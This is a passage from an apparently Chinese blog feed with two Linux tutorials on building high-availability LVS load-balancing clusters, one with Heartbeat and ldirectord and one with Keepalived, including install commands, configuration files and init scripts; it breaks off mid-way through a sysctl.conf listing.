href="http://www.ultramonkey.org/download/2.0.1/rh.el.3.0/RPMS/mkinitrd-3.5.13-1.um.1.i386.rpm" target="_blank" rel="noopener">http://www.ultramonkey.org/download/2.0.1/rh.el.3.0/RPMS/mkinitrd-3.5.13-1.um.1.i386.rpm</a></p><p>wget <a href="http://www.ultramonkey.org/download/2.0.1/rh.el.3.0/RPMS/kernel-2.4.21-27.0.2.EL.um.1.i686.rpm" target="_blank" rel="noopener">http://www.ultramonkey.org/download/2.0.1/rh.el.3.0/RPMS/kernel-2.4.21-27.0.2.EL.um.1.i686.rpm</a></p><p>wget <a href="http://www.ultramonkey.org/download/2.0.1/rh.el.3.0/RPMS/kernel-smp-2.4.21-27.0.2.EL.um.1.i686.rpm" target="_blank" rel="noopener">http://www.ultramonkey.org/download/2.0.1/rh.el.3.0/RPMS/kernel-smp-2.4.21-27.0.2.EL.um.1.i686.rpm</a></p><p>rpm -Fhv mkinitrd-3.5.13-1.um.1.i386.rpm</p><p>rpm -Fhv kernel-2.4.21-27.0.2.EL.um.1.i686.rpm</p><p>在Load Banlancer和Backup上安装IPVS管理软件：</p><p>wget <a href="http://www.linuxvirtualserver.org/software/kernel-2.4/ipvs-1.0.10.tar.gz" target="_blank" rel="noopener">http://www.linuxvirtualserver.org/software/kernel-2.4/ipvs-1.0.10.tar.gz</a></p><pre><code>tar zxf ipvs-1.0.10.tar.gzcd ipvs-1.0.10/ipvs/ipvsadmmake install</code></pre><p>chkconfig –del ipvsadm</p><p>配置IPVS(/etc/sysconfig/ipvsadm)，添加Real Server：</p><p>-A -t 192.168.136.10:80 -s rr</p><pre><code>-a -t 192.168.136.10:80 -r 192.168.136.11:80 -i-a -t 192.168.136.10:80 -r 192.168.136.12:80 -i-a -t 192.168.136.10:80 -r 192.168.136.101:80 -i-a -t 192.168.136.10:80 -r 192.168.136.102:80 -i-a -t 192.168.136.10:80 -r 192.168.136.103:80 -i</code></pre><p>相关链接：</p><p>Kernel：</p><p><a href="http://www.kernel.org/" target="_blank" rel="noopener">http://www.kernel.org/</a></p><p>IPVS和IPVSadm：</p><p><a href="http://www.linuxvirtualserver.org/software/ipvs.html" target="_blank" rel="noopener">http://www.linuxvirtualserver.org/software/ipvs.html</a></p><p>ARP hidden：</p><p><a href="http://www.ssi.bg/~ja/#hidden" target="_blank" rel="noopener">http://www.ssi.bg/~ja/#hidden</a></p><p>注意事项：</p><p>1. Kernel,IPVS,IPVSadm,ARP hidden之间的版本必须对应。</p><p>2. 自己编译内核时，从<a href="http://www.kernel.org/下载标准内核源文件，不要使用发行版的内核源文件。" target="_blank" rel="noopener">http://www.kernel.org/下载标准内核源文件，不要使用发行版的内核源文件。</a></p><p>3. Kernel 2.4.28和2.6.10及以上版本已内置IPVS，有些Linux发行版也在其内核里编译了IPVS。</p><p>4. ARP hidden可以用arp_ignore/arp_announce或者arptables代替</p><p>HeartBeat</p><p>HeartBeat是Linux-HA 的高可用性集群软件，它的主要作用是：</p><ul><li><p>安装在Load Balancer和Backup上，运行于active/standby模式。</p><pre><code>当Load Balancer失效时，Backup自动激活，成为实际的Load Balancer。</code></pre></li><li><p>切换到active模式时，按顺序启动Virtual IP、IPVS和Ldirectord。</p><pre><code>切换到standby模式时，按顺序关闭Ldirectord、IPVS和Virtual IP。</code></pre></li></ul><p>HeartBeat串口线连接测试方法：</p><p>在Load Balancer上：cat  /dev/ttyS0</p><p>修改主机名(/etc/hosts)：</p><p>127.0.0.1         localhost.localdomain localhost</p><p>  192.168.136.11    loadbalancer</p><p>  192.168.136.12    backup</p><p>安装：</p><p>groupadd -g 694 haclient</p><pre><code>useradd -u 694 -g haclient hacluster        rpm -ivh /mnt/cdrom/RedHat/RPMS/glib2-devel-*    wget http://www.packetfactory.net/libnet/dist/libnet.tar.gztar zxf libnet.tar.gzcd libnet./configuremakemake installwget http://www.linux-ha.org/download/heartbeat-1.99.4-tar.gztar zxf heartbeat-1.99.4.tar.gzcd heartbeat-1.99.4./ConfigureMe configure --disable-swig --disable-snmp-subagentmakemake install        cp doc/ha.cf doc/haresources doc/authkeys /etc/ha.d/        cp ldirectord/ldirectord.cf /etc/ha.d/chkconfig --add heartbeat        chkconfig --del ldirectord</code></pre><p>主配置文件(/etc/ha.d/ha.cf)：</p><p>#debugfile /var/log/ha-debug</p><pre><code>logfile /var/log/ha-loglogfacility local0keepalive 2deadtime 30warntime 10initdead 120udpport 694baud 19200serial /dev/ttyS0mcast eth0 225.0.0.1 694 1 0# 当主节点恢复后，是否自动切回auto_failback on# stonith用来保证共享存储环境中的数据完整性#stonith baytech /etc/ha.d/conf/stonith.baytech# watchdog能让系统在出现故障1分钟后重启该机器。这个功能可以帮助服务器在确实停止心跳后能够重新恢复心跳。# 如果使用该特性，则在内核中装入&quot;softdog&quot;内核模块，用来生成实际的设备文件，输入&quot;insmod softdog&quot;加载模块。# 输入&quot;grep misc /proc/devices&quot;(应为10)，输入&quot;cat /proc/misc | grep watchdog&quot;(应为130)。# 生成设备文件：&quot;mknod /dev/watchdog c 10 130&quot; 。#watchdog /dev/watchdognode loadbalancernode backup# 默认heartbeat并不检测除本身之外的其他任何服务，也不检测网络状况。# 所以当网络中断时，并不会进行Load Balancer和Backup之间的切换。# 可以通过ipfail插件，设置&apos;ping nodes&apos;来解决这一问题。详细说明参考hearbeat文档。#ping 192.168.136.1 172.16.0.1ping_group group1 192.168.136.1 192.168.136.2respawn root /usr/lib/heartbeat/ipfailapiauth ipfail gid=root uid=root# 其他一些插件可以在/usr/lib/heartbeat下找到#apiauth ipfail uid=hacluster#apiauth ccm uid=hacluster#apiauth cms uid=hacluster#apiauth ping gid=haclient uid=alanr,root#apiauth default gid=haclient</code></pre><p>资源文件(/etc/ha.d/haresources)：</p><p>loadbalancer lvs IPaddr::192.168.136.10/24/eth0 ipvsadm ldirectord</p><p>认证文件(/etc/ha.d/authkeys)，选取一种认证方式，这个文件的权限必须是600：</p><p>auth 1</p><pre><code>1 crc#2 sha1 sha1\_any\_password#3 md5 md5\_any\_password</code></pre><p>相关链接：</p><p>  Linux-HA：</p><p><a href="http://www.linux-ha.org/" target="_blank" rel="noopener">http://www.linux-ha.org</a></p><p>ldirectord</p><p>安装HeartBeat过程中，已经自动安装了Ldirectord，它的作用是：</p><ul><li>监测Real Server，当Real Server失效时 ，把它从Load Balancer列表中删除，恢复时重新添加。</li></ul><p>配置(/etc/ha.d/ldirectord.cf)：</p><p># Global Directives</p><p>  checktimeout=3</p><p>  checkinterval=1</p><p>  fallback=127.0.0.1:80</p><p>  autoreload=yes</p><p>  logfile=”/var/log/ldirectord.log”</p><p>  quiescent=yes</p><p># A sample virual with a fallback that will override the gobal setting</p><pre><code>virtual=192.168.136.10:80        real=192.168.136.11:80  ipip        real=192.168.136.12:80  ipip        real=192.168.136.101:80 ipip                real=192.168.136.102:80 ipip                real=192.168.136.103:80 ipip        fallback=127.0.0.1:80   gate        service=http        request=&quot;test.html&quot;        receive=&quot;Test Page&quot;        virtualhost=www.funbsd.net        scheduler=rr        #persistent=600        #netmask=255.255.255.255        protocol=tcp</code></pre><p>在每个Real Server的中添加监控页：</p><p>echo “Test Page” &gt;&gt; /var/www/html/test.html</p><p>Patch</p><p>在启动集群系统之前，我们认为包括Load Balancer和Backup在内的所有服务器都是Real Server。</p><p>在服务器上添加以下脚本/etc/init.d/tunl，用来配置tunl端口，应用arp补丁：</p><p>#!/bin/sh</p><h1 id="chkconfig-2345-70-10"><a href="#chkconfig-2345-70-10" class="headerlink" title="chkconfig: 2345 70 10"></a>chkconfig: 2345 70 10</h1><h1 id="description-Config-tunl-port-and-apply-arp-patch"><a href="#description-Config-tunl-port-and-apply-arp-patch" class="headerlink" title="description: Config tunl port and apply arp patch"></a>description: Config tunl port and apply arp patch</h1><p>VIP=192.168.136.10</p><p>. /etc/rc.d/init.d/functions</p><p>case “$1” in</p><pre><code>start)    echo &quot;Tunl port starting&quot;    ifconfig tunl0 $VIP netmask 255.255.255.255 broadcast $VIP up    echo 1 &gt; /proc/sys/net/ipv4/ip_forward    echo 1 &gt; /proc/sys/net/ipv4/conf/all/hidden    echo 1 &gt; /proc/sys/net/ipv4/conf/tunl0/hidden    ;;stop)    echo &quot;Tunl port closing&quot;    ifconfig tunl0 down    echo 1 &gt; /proc/sys/net/ipv4/ip_forward    echo 0 &gt; /proc/sys/net/ipv4/conf/all/hidden    ;;*)    echo &quot;Usage: $0 {start|stop}&quot;    exit 1</code></pre><p>  esac</p><p>如果有多个Virutal IP，可以使用tunl0:0,tunl0:1…。</p><pre><code>chmod 755 /etc/init.d/tunlchkconfig --add tunl</code></pre><p>在Load Balancer和Backup上，这个脚本的启动级必须先于heartbeat，关闭级必须后于heartbeat。</p><p>Scripts</p><p>在HeartBeat资源文件(/etc/ha.d/haresources)中定义了实现集群所需的各个软件的启动脚本。</p><p>这些脚本必须放在/etc/init.d或者/etc/ha.d/resource.d目录里，启动顺序不能变：</p><p>loadbalancer lvs IPaddr::192.168.136.10/24/eth0 ipvsadm ldirectord</p><p>IPaddr的作用是启动Virutal IP，它是HeartBeart自带的一个脚本。</p><p>ipvsadm的作用是在启动的时候把所有Real Server加入群中。</p><p>ldirectord的作用是启动ldirectord监控程序。</p><p>lvs的作用是为启动Load Balancer做准备，关闭tunl端口，取消arp补丁：</p><p>#!/bin/sh</p><h1 id="chkconfig-2345-90-10"><a href="#chkconfig-2345-90-10" class="headerlink" title="chkconfig: 2345 90 10"></a>chkconfig: 2345 90 10</h1><h1 id="description-Preparing-for-Load-Balancer-and-Real-Server-switching"><a href="#description-Preparing-for-Load-Balancer-and-Real-Server-switching" class="headerlink" title="description: Preparing for Load Balancer and Real Server switching"></a>description: Preparing for Load Balancer and Real Server switching</h1><p>VIP=192.168.136.10</p><p>. /etc/rc.d/init.d/functions</p><p>case “$1” in</p><pre><code>start)    echo &quot;Preparing for Load Balancer&quot;    ifconfig tunl0 down    echo 1 &gt; /proc/sys/net/ipv4/ip_forward    echo 0 &gt; /proc/sys/net/ipv4/conf/all/hidden    ;;stop)    echo &quot;Preparing for Real Server&quot;    ifconfig tunl0 $VIP netmask 255.255.255.255 broadcast $VIP up    echo 1 &gt; /proc/sys/net/ipv4/ip_forward    echo 1 &gt; /proc/sys/net/ipv4/conf/all/hidden    echo 1 &gt; /proc/sys/net/ipv4/conf/tunl0/hidden    ;;*)    echo &quot;Usage: lvs {start|stop}&quot;    exit 1</code></pre><p>  esac</p><p>chmod 755 /etc/ha.d/resource.d/lvs</p><p>启动集群系统：</p><p>/etc/init.d/heartbeat start</p><p>Reference</p><p><a href="http://www.linuxvirtualserver.org/" target="_blank" rel="noopener">http://www.linuxvirtualserver.org/</a></p><p><a href="http://www.linux-ha.org/" target="_blank" rel="noopener">http://www.linux-ha.org/</a></p><p><a href="http://www.ultramonkey.org/" target="_blank" rel="noopener">http://www.ultramonkey.org/</a></p><p><a href="http://www.linuxts.com/modules/sections/index.php?op=viewarticle&amp;artid=375" target="_blank" rel="noopener">http://www.linuxts.com/modules/sections/index.php?op=viewarticle&amp;artid=375</a></p><p><a href="http://www.yesky.com/SoftChannel/72341302397632512/20040311/1776261.shtml" target="_blank" rel="noopener">http://www.yesky.com/SoftChannel/72341302397632512/20040311/1776261.shtml</a></p><p><a href="http://www-900.ibm.com/developerWorks/cn/linux/theme/special/index.shtml#cluster" target="_blank" rel="noopener">http://www-900.ibm.com/developerWorks/cn/linux/theme/special/index.shtml#cluster</a></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>LVS+Keepalived实现高可用集群</title>
      <link href="/2010/01/23/lvs-keepalived-implements-high-availability-clusters/"/>
      <url>/2010/01/23/lvs-keepalived-implements-high-availability-clusters/</url>
      <content type="html"><![CDATA[<p>操作系统平台：CentOS5.2</p><p>软件：LVS+keepalived</p><p>LVS+Keepalived 介绍</p><p>LVS</p><p>LVS是Linux Virtual Server的简写，意即Linux虚拟服务器，是一个虚拟的服务器集群系统。本项目在1998年5月由章文嵩博士成立，是中国国内最早出现的自由软件项目之一。目前有三种IP负载均衡技术（VS/NAT、VS/TUN和VS/DR）；</p><p>十种调度算法（rrr|wrr|lc|wlc|lblc|lblcr|dh|sh|sed|nq）。</p><p>Keepalvied</p><p>Keepalived在这里主要用作RealServer的健康状态检查以及LoadBalance主机和BackUP主机之间failover的实现</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/blogimg_chinaunix_090403211022.jpg" alt="LVS+Keepalived实现高可用集群  - suchalin - 为了更好的生活而奋斗！" title="LVS+Keepalived实现高可用集群  - suchalin - 为了更好的生活而奋斗！"></p><p>IP配置信息:</p><p>LVS-DR-Master          192.168.2.166</p><p>LVS-DR-BACKUP          192.168.2.167</p><p>LVS-DR-VIP             192.168.2.170        </p><p>WEB1-Realserver        192.168.2.171</p><p>WEB2-Realserver        192.168.2.172</p><p>GateWay                192.168.2.253</p><p>安装LVS和Keepalvied软件包</p><p>1. 下载相关软件包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#mkdir /usr/local/src/lvs</span><br><span class="line"></span><br><span class="line">#cd /usr/local/src/lvs</span><br><span class="line"></span><br><span class="line">#wget</span><br><span class="line"></span><br><span class="line">http://www.linuxvirtualserver.org/software/kernel-2.6/ipvsadm-1.24.tar.gz</span><br><span class="line"></span><br><span class="line">#wget</span><br><span class="line"></span><br><span class="line">http://www.keepalived.org/software/keepalived-1.1.15.tar.gz</span><br></pre></td></tr></table></figure></p><p>2. 安装LVS和Keepalived<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#lsmod |grep ip_vs</span><br><span class="line"></span><br><span class="line">#uname -r</span><br><span class="line"></span><br><span class="line">2.6.18-53.el5PAE</span><br><span class="line"></span><br><span class="line">#ln -s /usr/src/kernels/2.6.18-53.el5PAE-i686/  /usr/src/linux</span><br><span class="line"></span><br><span class="line">#tar zxvf ipvsadm-1.24.tar.gz</span><br><span class="line"></span><br><span class="line">#cd ipvsadm-1.24</span><br><span class="line"></span><br><span class="line">#make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">#find / -name ipvsadm  # 查看ipvsadm的位置</span><br><span class="line"></span><br><span class="line">#tar zxvf keepalived-1.1.15.tar.gz</span><br><span class="line"></span><br><span class="line">#cd keepalived-1.1.15</span><br><span class="line"></span><br><span class="line">#./configure  &amp;&amp; make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">#find / -name keepalived  # 查看keepalived位置               </span><br><span class="line"></span><br><span class="line">#cp /usr/local/etc/rc.d/init.d/keepalived /etc/rc.d/init.d/</span><br><span class="line"></span><br><span class="line">#cp /usr/local/etc/sysconfig/keepalived /etc/sysconfig/</span><br><span class="line"></span><br><span class="line">#mkdir /etc/keepalived</span><br><span class="line"></span><br><span class="line">#cp /usr/local/etc/keepalived/keepalived.conf /etc/keepalived/</span><br><span class="line"></span><br><span class="line">#cp /usr/local/sbin/keepalived /usr/sbin/</span><br><span class="line"></span><br><span class="line">#service keepalived start|stop     #做成系统启动服务方便管理.</span><br></pre></td></tr></table></figure></p><p>四. 配置LVS实现负载均衡</p><p>  1． LVS-DR，配置LVS脚本实现负载均衡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/local/sbin/lvs-dr.sh</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">\# description: start LVS of DirectorServer</span><br><span class="line"></span><br><span class="line">#Written by :NetSeek</span><br><span class="line"></span><br><span class="line">http://www.linuxtone.org</span><br><span class="line"></span><br><span class="line">GW=192.168.2.253</span><br><span class="line"></span><br><span class="line">\# website director vip.</span><br><span class="line"></span><br><span class="line">WEB_VIP=192.168.2.170</span><br><span class="line"></span><br><span class="line">WEB_RIP1=192.168.2.171</span><br><span class="line"></span><br><span class="line">WEB_RIP2=192.168.2.172</span><br><span class="line"></span><br><span class="line">. /etc/rc.d/init.d/functions</span><br><span class="line"></span><br><span class="line">logger $0 called with $1</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line"></span><br><span class="line">start)</span><br><span class="line"></span><br><span class="line">        # Clear all iptables rules.</span><br><span class="line"></span><br><span class="line">        /sbin/iptables -F</span><br><span class="line"></span><br><span class="line">        # Reset iptables counters.</span><br><span class="line"></span><br><span class="line">        /sbin/iptables -Z</span><br><span class="line"></span><br><span class="line">        # Clear all ipvsadm rules/services.</span><br><span class="line"></span><br><span class="line">        /sbin/ipvsadm -C</span><br><span class="line"></span><br><span class="line">#set lvs vip for dr</span><br><span class="line"></span><br><span class="line">        /sbin/ipvsadm --set 30 5 60</span><br><span class="line"></span><br><span class="line">        /sbin/ifconfig eth0:0 $WEB\_VIP broadcast $WEB\_VIP netmask 255.255.255.255 up</span><br><span class="line"></span><br><span class="line">        /sbin/route add -host $WEB_VIP dev eth0:0</span><br><span class="line"></span><br><span class="line">        /sbin/ipvsadm -A -t $WEB_VIP:80 -s wrr -p 3</span><br><span class="line"></span><br><span class="line">        /sbin/ipvsadm -a -t $WEB\_VIP:80 -r $WEB\_RIP1:80 -g -w 1</span><br><span class="line"></span><br><span class="line">        /sbin/ipvsadm -a -t $WEB\_VIP:80 -r $WEB\_RIP2:80 -g -w 1</span><br><span class="line"></span><br><span class="line">        touch /var/lock/subsys/ipvsadm &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">        # set Arp</span><br><span class="line"></span><br><span class="line">        /sbin/arping -I eth0 -c 5 -s $WEB_VIP $GW &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">       ;;</span><br><span class="line"></span><br><span class="line">stop)</span><br><span class="line"></span><br><span class="line">        /sbin/ipvsadm -C</span><br><span class="line"></span><br><span class="line">        /sbin/ipvsadm -Z</span><br><span class="line"></span><br><span class="line">        ifconfig eth0:0 down</span><br><span class="line"></span><br><span class="line">        route del $WEB_VIP  &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">        rm -rf /var/lock/subsys/ipvsadm &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">        /sbin/arping -I eth0 -c 5 -s $WEB_VIP $GW</span><br><span class="line"></span><br><span class="line">        echo &quot;ipvsadm stoped&quot;</span><br><span class="line"></span><br><span class="line">       ;;</span><br><span class="line"></span><br><span class="line">status)</span><br><span class="line"></span><br><span class="line">        if [ ! -e /var/lock/subsys/ipvsadm ];then</span><br><span class="line"></span><br><span class="line">                echo &quot;ipvsadm is stoped&quot;</span><br><span class="line"></span><br><span class="line">                exit 1</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line"></span><br><span class="line">                ipvsadm -ln</span><br><span class="line"></span><br><span class="line">                echo &quot;..........ipvsadm is OK.&quot;</span><br><span class="line"></span><br><span class="line">        fi</span><br><span class="line"></span><br><span class="line">      ;;</span><br><span class="line"></span><br><span class="line">*)</span><br><span class="line"></span><br><span class="line">        echo &quot;Usage: $0 &#123;start|stop|status&#125;&quot;</span><br><span class="line"></span><br><span class="line">        exit 1</span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure></p><p>2． 配置Realserver脚本.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">\# Written by NetSeek</span><br><span class="line"></span><br><span class="line">\# description: Config realserver lo and apply noarp</span><br><span class="line"></span><br><span class="line">WEB_VIP=192.168.2.170</span><br><span class="line"></span><br><span class="line">. /etc/rc.d/init.d/functions</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line"></span><br><span class="line">start)</span><br><span class="line"></span><br><span class="line">       ifconfig lo:0 $WEB\_VIP netmask 255.255.255.255 broadcast $WEB\_VIP</span><br><span class="line"></span><br><span class="line">       /sbin/route add -host $WEB_VIP dev lo:0</span><br><span class="line"></span><br><span class="line">       echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_ignore</span><br><span class="line"></span><br><span class="line">       echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_announce</span><br><span class="line"></span><br><span class="line">       echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore</span><br><span class="line"></span><br><span class="line">       echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce</span><br><span class="line"></span><br><span class="line">       sysctl -p &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">       echo &quot;RealServer Start OK&quot;</span><br><span class="line"></span><br><span class="line">       ;;</span><br><span class="line"></span><br><span class="line">stop)</span><br><span class="line"></span><br><span class="line">       ifconfig lo:0 down</span><br><span class="line"></span><br><span class="line">       route del $WEB_VIP &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">       echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_ignore</span><br><span class="line"></span><br><span class="line">       echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_announce</span><br><span class="line"></span><br><span class="line">       echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore</span><br><span class="line"></span><br><span class="line">       echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce</span><br><span class="line"></span><br><span class="line">       echo &quot;RealServer Stoped&quot;</span><br><span class="line"></span><br><span class="line">       ;;</span><br><span class="line"></span><br><span class="line">status)</span><br><span class="line"></span><br><span class="line">        # Status of LVS-DR real server.</span><br><span class="line"></span><br><span class="line">        islothere=`/sbin/ifconfig lo:0 | grep $WEB_VIP`</span><br><span class="line"></span><br><span class="line">        isrothere=\`netstat -rn | grep &quot;lo:0&quot; | grep $web_VIP\`</span><br><span class="line"></span><br><span class="line">        if [ ! &quot;$islothere&quot; -o ! &quot;isrothere&quot; ];then</span><br><span class="line"></span><br><span class="line">            # Either the route or the lo:0 device</span><br><span class="line"></span><br><span class="line">            # not found.</span><br><span class="line"></span><br><span class="line">            echo &quot;LVS-DR real server Stopped.&quot;</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line"></span><br><span class="line">            echo &quot;LVS-DR Running.&quot;</span><br><span class="line"></span><br><span class="line">        fi</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line">*)</span><br><span class="line"></span><br><span class="line">        # Invalid entry.</span><br><span class="line"></span><br><span class="line">        echo &quot;$0: Usage: $0 &#123;start|status|stop&#125;&quot;</span><br><span class="line"></span><br><span class="line">        exit 1</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure></p><p>附上realserver机上的/etc/sysctl.conf：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">\# Kernel sysctl configuration file for Red Hat Linux</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">\# For binary values, 0 is disabled, 1 is enabled.  See sysctl(8) and</span><br><span class="line"></span><br><span class="line">\# sysctl.conf(5) for more details.</span><br><span class="line"></span><br><span class="line">\# Controls IP packet forwarding</span><br><span class="line"></span><br><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line"></span><br><span class="line">\# Controls source route verification</span><br><span class="line"></span><br><span class="line">net.ipv4.conf.default.rp_filter = 1</span><br><span class="line"></span><br><span class="line">\# Do not accept source routing</span><br><span class="line"></span><br><span class="line">net.ipv4.conf.default.accept\_source\_route = 0</span><br><span 